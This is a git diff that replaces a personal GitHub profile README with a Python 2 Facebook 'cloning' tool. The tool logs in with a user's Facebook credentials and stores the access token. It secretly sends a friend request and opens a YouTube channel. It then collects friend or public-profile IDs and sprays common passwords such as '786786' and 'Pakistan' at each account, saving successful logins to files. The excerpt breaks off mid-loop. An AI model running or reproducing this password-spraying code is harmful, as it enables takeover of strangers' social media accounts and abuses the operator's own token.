@@ -1,184 +1,820 @@
-<h3 align="center">
+#!/usr/bin/python2
 
-  <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25">
+#coding=utf-8
 
-  &nbsp; Welcome to Akkuk profile &nbsp;
+#The Credit For This Code Goes To Akkukhacker
 
-  <img src="https://emoji.discord.st/emojis/768b108d-274f-4f44-a634-8477b16efce7.gif" width="25">
+#If You Wanna Take Credits For This Code, Please Look Yourself Again...
 
-</h3>
+#Reserved2020
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-1.svg">
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 
-[![Typing SVG](https://readme-typing-svg.herokuapp.com?color=%23F70B10&size=27&lines=I+am+Akkuk;+It's+Not+A+Just+Name+Bro;It's+A+Brand;Thank+You+Everyone+LvuAll)](https://git.io/typing-svg)
+from multiprocessing.pool import ThreadPool
 
-</p>
+from requests.exceptions import ConnectionError
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-1.svg">
+from mechanize import Browser
 
-<h3 align="center">A passionate frontend developer from Bangladesh</h3>
+reload(sys)
 
-<p align="left"> <img src="https://komarev.com/ghpvc/?username= Akkuk-143&label=Profile%20views&color=eb4d3d&style=flat-square" alt="Akkuk" /> </p>
+sys.setdefaultencoding('utf8')
 
-</i></b></h3>
+br = mechanize.Browser()
 
-<h3><b><i> Github Statistics :
+br.set_handle_robots(False)
 
-</i></b></h3>
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 
-<a href="https://github.com/Akkuk/zqoud.git"><img width=550 src="https://github-profile-trophy.vercel.app/?username=Akkuk&row=2&column=3 noframe=true&title=Followers,Stars,Commit,Repository,Issues, PullRequest"/></a>
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+def keluar():
 
-- 😏 𝐍𝐀𝐌𝐄:- Akku singh 
+	print "\x1b[1;91mExit"	os.sys.exit()
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+def acak(b):
 
-- 😎 𝐀𝐆𝐄:- 18
+    w = 'ahtdzjc'
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+    d = ''
 
-- 📕 𝐄𝐃𝐔𝐂𝐀𝐓𝐈𝐎𝐍:- 𝐄𝐍𝐓𝐄𝐑 2𝐍𝐃 𝐘𝐄𝐀𝐑
+    for i in x:
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+        d += '!'+w[random.randint(0,len(w)-1)]+i
 
-- ❤ 𝐋𝐎𝐕𝐄𝐑:- 𝐀𝐌𝐌𝐎
+    return cetak(d)
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+def cetak(b):
 
-- 👉 𝐈𝐍𝐒𝐋𝐈𝐑𝐀𝐓𝐈𝐎𝐍:- 𝐌𝐘𝐒𝐄𝐋𝐅
+    w = 'ahtdzjc'
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+    for i in w:
 
-- 🤲🏻 𝐑𝐄𝐋𝐈𝐆𝐈𝐎𝐍:- Hindu 
+        j = w.index(i)
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
 
-- 📱𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊:- [Akkusingh](https://www.facebook.com/profile.php?id=100004338602991)
+    x += '\033[0m'
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+    x = x.replace('!0','\033[0m')
 
-- 📱𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐏𝐀𝐆𝐄:- [Akkusingh](https://www.facebook.com/profile.php?id=100076785121768)
+    sys.stdout.write(x+'\n')
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+def jalan(z):
 
-- 💻𝐆𝐈𝐓𝐇𝐔𝐁:- [Akku singh] (https://github.com/Akkuk/zqoud.git)
+	for e in z + '\n':
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+		sys.stdout.write(e)
 
-- ⚡ Fun fact **I think I am funny**
+		sys.stdout.flush()
 
-<img align="center" alt="line" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/images/line-2.svg">
+		time.sleep(0.07)
 
-<h2><img width="28" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/icons/icon-contact.png" /><i> Connect With Me :</i></h2>
+#Dev:Akkuka_hacker
 
-[![Instagram](https://img.shields.io/badge/IG-%40Akku singh?style=for-the-badge&logo=instagram)](https://www.instagram.com/its_akash66)
+##### LOGO #####
 
-[![Facebook](https://img.shields.io/badge/Facebook-green?style=for-the-badge&logo=facebook)](https://www.facebook.com/profile.php?id=100004338602991)
+logo = """
 
-[![Messenger](https://img.shields.io/badge/Chat-Messenger-blue?style=for-the-badge&logo=messenger)](https://www.facebook.com/profile.php?id=100004338602991)
+       \033[1;91m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:
 
-[![Github](https://img.shields.io/badge/Github-Akkukgreen?style=for-the-badge&logo=github)](https://github.com/Akkuk/zqoud.git)
+      \033[1;92m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒::     
 
-### ⚙️ &nbsp; Language & programming
+     \033[1;93m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒:::      
 
-<p align="left"> <a href="https://getbootstrap.com" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/bootstrap/bootstrap-plain-wordmark.svg" alt="bootstrap" width="40" height="40"/> </a> <a href="https://www.cprogramming.com/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/c/c-original.svg" alt="c" width="40" height="40"/> </a> <a href="https://www.w3schools.com/cpp/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/cplusplus/cplusplus-original.svg" alt="cplusplus" width="40" height="40"/> </a> <a href="https://www.w3schools.com/cs/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/csharp/csharp-original.svg" alt="csharp" width="40" height="40"/> </a> <a href="https://www.w3schools.com/css/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/css3/css3-original-wordmark.svg" alt="css3" width="40" height="40"/> </a> <a href="https://git-scm.com/" target="_blank"> <img src="https://www.vectorlogo.zone/logos/git-scm/git-scm-icon.svg" alt="git" width="40" height="40"/> </a> <a href="https://heroku.com" target="_blank"> <img src="https://www.vectorlogo.zone/logos/heroku/heroku-icon.svg" alt="heroku" width="40" height="40"/> </a> <a href="https://www.w3.org/html/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/html5/html5-original-wordmark.svg" alt="html5" width="40" height="40"/> </a> <a href="https://www.java.com" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/java/java-original.svg" alt="java" width="40" height="40"/> </a> <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/javascript/javascript-original.svg" alt="javascript" width="40" height="40"/> </a> <a href="https://laravel.com/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/laravel/laravel-plain-wordmark.svg" alt="laravel" width="40" height="40"/> </a> <a href="https://www.linux.org/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/linux/linux-original.svg" alt="linux" width="40" height="40"/> </a> <a href="https://www.mysql.com/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/mysql/mysql-original-wordmark.svg" alt="mysql" width="40" height="40"/> </a> <a href="https://www.php.net" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/php/php-original.svg" alt="php" width="40" height="40"/> </a> <a href="https://www.python.org" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="40" height="40"/> </a> <a href="https://tailwindcss.com/" target="_blank"> <img src="https://www.vectorlogo.zone/logos/tailwindcss/tailwindcss-icon.svg" alt="tailwind" width="40" height="40"/> </a> </p>
+    \033[1;94m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      
 
-<h2><img width="25" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/icons/icon-skills.png" /><i> Skills & DevTools Stack :</i></h2>
+   \033[1;95m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         
 
-![Python](https://img.shields.io/badge/-Python-05122A?style=flat&logo=python)&nbsp;
+  \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
 
-![JavaScript](https://img.shields.io/badge/-JavaScript-05122A?style=flat&logo=javascript)&nbsp;
+  \033[1;91m:》》》\033[1;93m+923155912839\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
 
-![React](https://img.shields.io/badge/-React-05122A?style=flat&logo=react)&nbsp;
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-BlackMafia-\033[1;95m♡╭──────────•◈•──────────╮♡
 
-![Node.js](https://img.shields.io/badge/-Node.js-05122A?style=flat&logo=node.js)&nbsp;
+\033[1;92m..........................HamidKhawaja......................
 
-![Bootstrap](https://img.shields.io/badge/-Bootstrap-05122A?style=flat&logo=bootstrap&logoColor=563D7C)\
+\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
 
-![HTML](https://img.shields.io/badge/-HTML-05122A?style=flat&logo=HTML5)&nbsp;
+\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Pakistan
 
-![CSS](https://img.shields.io/badge/-CSS-05122A?style=flat&logo=CSS3&logoColor=1572B6)&nbsp;
+\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
 
-![Git](https://img.shields.io/badge/-Git-05122A?style=flat&logo=git)&nbsp;
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mAkkusingh\033[1;95m♡╰──────────•◈•──────────╯♡"""
 
-![GitHub](https://img.shields.io/badge/-GitHub-05122A?style=flat&logo=github)&nbsp;
+def tik():
 
-![Markdown](https://img.shields.io/badge/-Markdown-05122A?style=flat&logo=markdown)\
+	titik = ['.   ','..  ','... ']
 
-![Visual Studio Code](https://img.shields.io/badge/-Visual%20Studio%20Code-05122A?style=flat&logo=visual-studio-code&logoColor=007ACC)&nbsp;
+	for o in titik:
 
-![Illustrator](https://img.shields.io/badge/-Illustrator-05122A?style=flat&logo=adobe-illustrator)&nbsp;
+		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
-![Photoshop](https://img.shields.io/badge/-Photoshop-05122A?style=flat&logo=adobe-photoshop)&nbsp;
+back = 0
 
-<h2> <img width="25" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/icons/icon-stats.png" /><i> GitHub Stats :</i></h2>
+berhasil = []
 
-<table border="1">
+cekpoint = []
 
-  <tr>
+oks = []
 
-    <td valign="top"><a href="https://github.com/Akkuk/zqoud.git/github-readme-stats"> <img src="https://github-readme-stats.vercel.app/api?username=Akkuk&count_private=true&show_icons=true&icon_color=FFA500&title_color=f4791f&bg_color=0,03071e,0F2027,03071e&text_color=abcdef&border_radius=10" alt ="Akkuk'sGitHub stats"/></td> </a>
+id = []
 
-    <td valign="top"> <a href="https://github.com/Akkuk/zqoud.git//github-readme-stats"> <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=Akkuk&layout=compact&langs_count=10" alt ="Top Languages"/></td>
+listgrup = []
 
-    </a>
+vulnot = "\033[31mNot Vuln"
 
-  </tr>
+vuln = "\033[32mVuln"
 
-   <tr>
+os.system("clear")
 
-    <td colspan="2" align="center"> <a href="https://git.io/streak-stats"> <img src="http://github-readme-streak-stats.herokuapp.com?user=Akkuk&hide_border=true&background=f6f8fa&stroke=001427&ring=e36414&fire=e36414&currStreakNum=03045e&sideNums=03045e&currStreakLabel=03045e&sideLabels=240046&dates=fb5607&date_format=j%20M%5B%20Y%5D" alt ="Mahadi's GitHub Readme Streak Stats"/> </a>  </td> 
+print  """
 
-    
+  \033[1;96m-┈┈┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈         
 
-  </tr>
+  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈        
 
-</table>
+  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   
 
-<br>
+ \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈   
 
-### Profile Visitors
+ \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
 
-![visitor badge](https://visitor-badge.glitch.me/badge?page_id=Akkuk.visitor-badge&left_color=blue&right_color=yellow)
+ \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
 
-<br />
+  \033[1;96m ─────────────•◈•──────────  
 
-<h2><img width="28" src="https://github.com/DalpatRathore/dalpatrathore/blob/main/assets/icons/icon-graph.png" /><i> GitHub Contribution Graph :</i></h2>
+   \033[1;92m███████▒▒Welcome To HamiiWorld▒▒████████
 
-[![Kshitij's github activity graph](https://my-activity-graph-instance.herokuapp.com/graph?username=Akkuk&theme=react-dark&area=true&hide_border=true)](https://github.com/ashutosh00710/github-readme-activity-graph)
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mHamiiWorld\033[1;95m♡╭──────────•◈•──────────╮♡
 
-<a href="https://github.com/Akkuk/zqoud.git/COUNTY-NUMBER"><img title="COUNTY-NUMBER" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=COUNTY-NUMBER&theme=gotham"></a>
+\033[1;94mAuthor\033[1;91m: \033[1;91mAkkuk
 
-<a href="https://github.com/Akkuk/zqoud.git/BRUTE-ATTACK"><img title="BRUTE-ATTACK" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=BRUTE-ATTACK&theme=gotham"></a>
+\033[1;94mBlackMafia\033[1;91m: \033[1;91▒▓██████████████]99.9
 
-<a href="https://github.com/Akkuk/zqoud.git/WORLD-FRIEND2"><img title="WORLD-FRIEND2" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=WORLD-FRIEND2&theme=gotham"></a>
+\033[1;94mFacebook\033[1;91m: \033[1;91mAkkukhacker
 
-<a href="https://github.com/Akkuk/zqoud.git/NUMBER-PK"><img title="NUMBER-PK" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=NUMBER-PK&theme=gotham"></a>
+\033[1;94mWhatsapp\033[1;91m: \033[1;91m+919084319506
 
-<a href="https://github.com/Akkuk/zqoud.git/INDIAN.git"><img title="INDIAN" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=INDIAN&theme=gotham"></a>
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mHamidKhawaja\033[1;95m♡╰──────────•◈•──────────╯♡"""
 
-<a href="https://github.com/Akkuk/zqoud.git/BD-NUMB3R"><img title="BD-NUMB3R" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=BD-NUMB3R&theme=gotham"></a>
+jalan('              \033[1;96m....................zqoud.....................:')
 
-<a href="https://github.com/Akkuk/zqoud.git/BD-SIX-HK.git"><img title="BD-SIX-HK" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=BD-SIX-HK&theme=gotham"></a>
+jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
 
-<a href="https://github.com/Akkuk/zqoud.git/Token.git"><img title="Token" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=Token&theme=gotham"></a>
+jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
 
-<a href="https://github.com/Akkuk/zqoud.git/PK-NUMBER.git"><img title="PK-NUMBER" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=PK-NUMBER&theme=gotham"></a>
+jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
 
-<a href="https://github.com/Akkuk/zqoud.git/Pakistan.git"><img title="Pakistan" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=Pakistan&theme=gotham"></a>
+jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
 
-<a href="https://github.com/Akkuk/zqoud.git/FRIEND-CHECK3R.git"><img title="FRIEND-CHECK3R" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=FRIEND-CHECK3R&theme=gotham"></a>
+jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
 
-<a href="https://github.com/Akkuk/zqoud.git/BEST-FDCLON.git"><img title="BEST-FDCLON" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&arepo=BEST-FDCLON&theme=gotham"></a>
+print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin HamiiWorld\033[1;95m♡╰──────────•◈•──────────╯♡"
 
-<a href="https://github.com/Akkuk/zqoud.githttps://github.com/Akkuk/zqoud.git/R4ND0M.git"><img title="R4ND0M" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=R4ND0M&theme=gotham"></a>
+CorrectUsername = "Akku"
 
-<a href="https://github.com/Akkuk/zqoud.git/BD-EIGHT.git"><img title="BD-EIGHT" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=BD-EIGHT&theme=gotham"></a>
+CorrectPassword = "singh"
 
-<a href="https://github.com/Akkuk/zqoud.git/PK-BD.git"><img title="PK-BD" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=PK-BD&theme=gotham"></a>
+loop = 'true'
 
-<a href="https://github.com/Akkuk/zqoud.git/SPEED-FDCL.git"><img title="SPEED-FDCL" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk3&repo=SPEED-FDCL&theme=gotham"></a>
+while (loop == 'true'):
 
-<a href="https://github.com/Akkuk/zqoud.git/PAK.git"><img title="PAK" src="https://github-readme-stats.vercel.app/api/pin/?username=Akkuk&repo=PAK&theme=gotham"></a>
+    username = raw_input("\033[1;91m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")
+
+    if (username == CorrectUsername):
+
+    	password = raw_input("\033[1;94m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
+
+        if (password == CorrectPassword):
+
+            print "Logged in successfully as " + username #Dev:Akkuk_hacker
+
+	    time.sleep(2)
+
+            loop = 'false'
+
+        else:
+
+            print "\033[1;91mWrong Password"
+
+            os.system('xdg-open https://youtube.com/channel/UCBwpcFg6e2LmbRzL1QU39eQ')
+
+    else:
+
+        print "\033[1;94mWrong Username"
+
+        os.system('xdg-open https://youtube.com/channel/UCBwpcFg6e2LmbRzL1QU39eQ')
+
+def login():
+
+	os.system('clear')
+
+	try:
+
+		toket = open('login.txt','r')
+
+		menu() 
+
+	except (KeyError,IOError):
+
+		os.system('clear')
+
+		print logo
+
+		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
+
+		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
+
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mAkkusingh\033[1;95m♡──────────•◈•──────────♡"
+
+		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
+
+		print('	' )
+
+		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
+
+		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
+
+		tik()
+
+		try:
+
+			br.open('https://m.facebook.com')
+
+		except mechanize.URLError:
+
+			print"\n\x1b[1;96mThere is no internet connection"
+
+			keluar()
+
+		br._factory.is_html = True
+
+		br.select_form(nr=0)
+
+		br.form['email'] = id
+
+		br.form['pass'] = pwd
+
+		br.submit()
+
+		url = br.geturl()
+
+		if 'save-device' in url:
+
+			try:
+
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+
+				x=hashlib.new("md5")
+
+				x.update(sig)
+
+				a=x.hexdigest()
+
+				data.update({'sig':a})
+
+				url = "https://api.facebook.com/restserver.php"
+
+				r=requests.get(url,params=data)
+
+				z=json.loads(r.text)
+
+				unikers = open("login.txt", 'w')
+
+				unikers.write(z['access_token'])
+
+				unikers.close()
+
+				print '\n\x1b[1;95mLogin Successful...'
+
+				os.system('xdg-open https://youtube.com/channel/UCBwpcFg6e2LmbRzL1QU39eQ')
+
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+
+				menu()
+
+			except requests.exceptions.ConnectionError:
+
+				print"\n\x1b[1;91mThere is no internet connection"
+
+				keluar()
+
+		if 'checkpoint' in url:
+
+			print("\n\x1b[1;92mYour Account is on Checkpoint")
+
+			os.system('rm -rf login.txt')
+
+			time.sleep(1)
+
+			keluar()
+
+		else:
+
+			print("\n\x1b[1;93mPassword/Email is wrong")
+
+			os.system('rm -rf login.txt')
+
+			time.sleep(1)
+
+			login()
+
+def menu():
+
+	os.system('clear')
+
+	try:
+
+		toket=open('login.txt','r').read()
+
+	except IOError:
+
+		os.system('clear')
+
+		print"\x1b[1;91mToken invalid"
+
+		os.system('rm -rf login.txt')
+
+		time.sleep(1)
+
+		login()
+
+	try:
+
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+
+		a = json.loads(otw.text)
+
+		nama = a['name']
+
+		id = a['id']
+
+	except KeyError:
+
+		os.system('clear')
+
+		print"\033[1;91mYour Account is on Checkpoint"
+
+		os.system('rm -rf login.txt')
+
+		time.sleep(1)
+
+		login()
+
+	except requests.exceptions.ConnectionError:
+
+		print"\x1b[1;92mThere is no internet connection"
+
+		keluar()
+
+	os.system("clear") #Dev:Akkuk_hacker
+
+	print logo
+
+	print "  \033[1;95m«-----♡----\033[1;93mLogged in User Info\033[1;95m----♡-----»"
+
+	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
+
+	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
+
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mHamiiWorld\033[1;95m♡──────────•◈•──────────♡"
+
+	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
+
+	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
+
+	pilih()
+
+def pilih():
+
+	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
+
+	if unikers =="":
+
+		print "\x1b[1;91mFill in correctly"
+
+		pilih()
+
+	elif unikers =="1":
+
+		super()
+
+	elif unikers =="0":
+
+		jalan('Token Removed')
+
+		os.system('rm -rf login.txt')
+
+		keluar()
+
+	else:
+
+		print "\x1b[1;91mFill in correctly"
+
+		pilih()
+
+def super():
+
+	global toket
+
+	os.system('clear')
+
+	try:
+
+		toket=open('login.txt','r').read()
+
+	except IOError:
+
+		print"\x1b[1;91mToken invalid"
+
+		os.system('rm -rf login.txt')
+
+		time.sleep(1)
+
+		login()
+
+	os.system('clear')
+
+	print logo
+
+	print "\033[1;96m--\033[1;92m> \033[1;92m1.\x1b[1;91mClone From Friend List..."
+
+	print "\033[1;96m--\033[1;92m> \033[1;92m2.\x1b[1;91mClone From Public ID..."
+
+	print "\033[1;96m--\033[1;91m> \033[1;91m0.\033[1;94mBack"
+
+	pilih_super()
+
+def pilih_super():
+
+	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
+
+	if peak =="":
+
+		print "\x1b[1;91mFill in correctly"
+
+		pilih_super()
+
+	elif peak =="1":
+
+		os.system('clear')
+
+		print logo
+
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mHamidKhawaja\033[1;95m♡──────────•◈•──────────♡"
+
+		jalan('\033[1;93mGetting IDs \033[1;97m...')
+
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+
+		z = json.loads(r.text)
+
+		for s in z['data']:
+
+			id.append(s['id'])
+
+	elif peak =="2":
+
+		os.system('clear')
+
+		print logo
+
+		idt = raw_input("\033[1;96m[♡] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
+
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mHamidKhawaja\033[1;95m♡──────────•◈•──────────╯♡"
+
+		try:
+
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+
+			op = json.loads(jok.text)
+
+			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
+
+		except KeyError:
+
+			print"\x1b[1;92mID Not Found!"
+
+			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
+
+			super()
+
+		print"\033[1;93mGetting IDs\033[1;93m..."
+
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+
+		z = json.loads(r.text)
+
+		for i in z['data']:
+
+			id.append(i['id'])
+
+	elif peak =="0":
+
+		menu()
+
+	else:
+
+		print "\x1b[1;91mFill in correctly"
+
+		pilih_super()
+
+	
+
+	print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
+
+	jalan('\033[1;92mPlease Wait\033[1;93m...')
+
+	titik = ['.   ','..  ','... ']
+
+	for o in titik:
+
+		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"
+
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mHamidKhawaja\033[1;95m♡──────────•◈•──────────♡"
+
+	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
+
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mHamidKhawaja\033[1;95m♡──────────•◈•──────────♡"
+
+	
+
+			
+
+	def main(arg):
+
+		global cekpoint,oks
+
+		user = arg
+
+		try:
+
+			os.mkdir('out')
+
+		except OSError:
+
+			pass #Dev:Akuk_hacker
+
+		try:
+
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+
+			b = json.loads(a.text)
+
+			pass1 = ('786786')
+
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+
+			q = json.load(data)
+
+			if 'access_token' in q:
+
+				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
+
+				oks.append(user+pass1)
+
+			else:
+
+				if 'www.facebook.com' in q["error_msg"]:
+
+					print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
+
+					cek = open("out/checkpoint.txt", "a")
+
+					cek.write(user+"|"+pass1+"\n")
+
+					cek.close()
+
+					cekpoint.append(user+pass1)
+
+				else:
+
+					pass2 = 'Pakistan'
+
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+
+					q = json.load(data)
+
+					if 'access_token' in q:
+
+						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
+
+						oks.append(user+pass2)
+
+					else:
+
+						if 'www.facebook.com' in q["error_msg"]:
+
